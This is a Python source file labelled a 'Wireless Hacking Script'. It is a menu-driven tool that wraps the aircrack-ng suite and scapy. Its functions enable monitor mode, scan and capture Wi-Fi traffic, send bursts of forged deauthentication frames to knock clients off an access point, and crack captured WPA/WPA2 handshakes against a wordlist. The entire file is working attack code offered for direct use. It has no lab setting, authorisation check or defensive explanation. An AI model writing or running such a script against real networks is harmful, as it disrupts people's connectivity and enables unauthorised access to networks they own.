import os
import subprocess
from scapy.all import *

# Function to enable monitor mode on the wireless interface
def enable_monitor_mode(interface):
    print(f"[*] Enabling monitor mode on {interface}...")
    subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True)
    print(f"[+] Monitor mode enabled on {interface}")

# Function to scan for nearby wireless networks
def scan_wireless(interface):
    print(f"[*] Scanning for wireless networks on {interface}...")
    subprocess.run(['sudo', 'airodump-ng', interface], check=True)

# Function to capture packets on a specified channel and save to a file
def capture_packets(interface, channel, output_file):
    print(f"[*] Capturing packets on {interface}, channel {channel}...")
    subprocess.run(['sudo', 'airodump-ng', interface, '-c', channel, '-w', output_file], check=True)
    print(f"[+] Packets captured and saved to {output_file}-01.cap")

# Function to deauthenticate clients from an access point
def deauth_attack(target_mac, ap_mac, interface):
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    print(f"[*] Sending deauthentication packets to {target_mac} from AP {ap_mac} on {interface}...")
    sendp(packet, iface=interface, count=100, inter=0.1)
    print("[+] Deauthentication attack completed")

# Function to start WPA/WPA2 cracking using aircrack-ng
def wpa_crack(handshake_file, wordlist):
    print(f"[*] Cracking WPA/WPA2 using handshake file {handshake_file} and wordlist {wordlist}...")
    subprocess.run(['sudo', 'aircrack-ng', handshake_file, '-w', wordlist], check=True)

# Function to disable monitor mode and cleanup
def disable_monitor_mode(interface):
    print(f"[*] Disabling monitor mode on {interface}...")
    subprocess.run(['sudo', 'airmon-ng', 'stop', interface], check=True)
    print(f"[+] Monitor mode disabled on {interface}")

# Main function
def main():
    print("Wireless Hacking Script")
    print("[1] Enable Monitor Mode")
    print("[2] Scan Networks")
    print("[3] Capture Packets")
    print("[4] Deauthentication Attack")
    print("[5] Crack WPA/WPA2 Handshake")
    print("[6] Disable Monitor Mode")

    choice = input("Select an option: ")

    interface = "wlan0"  # Default interface
    target_mac = "00:11:22:33:44:55"  # Default target MAC
    ap_mac = "AA:BB:CC:DD:EE:FF"  # Default AP MAC
    handshake_file = "capture.cap"  # Default handshake file path
    wordlist = "wordlist.txt"  # Default wordlist path

    try:
        if choice == "1":
            enable_monitor_mode(interface)
        elif choice == "2":
            scan_wireless(interface)
        elif choice == "3":
            channel = input("Enter the channel to capture on (e.g., 6): ")
            output_file = input("Enter the output file name (without extension): ")
            capture_packets(interface, channel, output_file)
        elif choice == "4":
            target_mac = input("Enter the target MAC address: ") or target_mac
            ap_mac = input("Enter the AP MAC address: ") or ap_mac
            deauth_attack(target_mac, ap_mac, interface)
        elif choice == "5":
            handshake_file = input("Enter the path to the captured handshake file: ") or handshake_file
            wordlist = input("Enter the path to the wordlist: ") or wordlist
            wpa_crack(handshake_file, wordlist)
        elif choice == "6":
            disable_monitor_mode(interface)
        else:
            print("Invalid choice. Exiting.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")
    finally:
        if choice != "6":  # Automatically disable monitor mode if not already done
            disable_monitor_mode(interface)

if __name__ == "__main__":
    main()
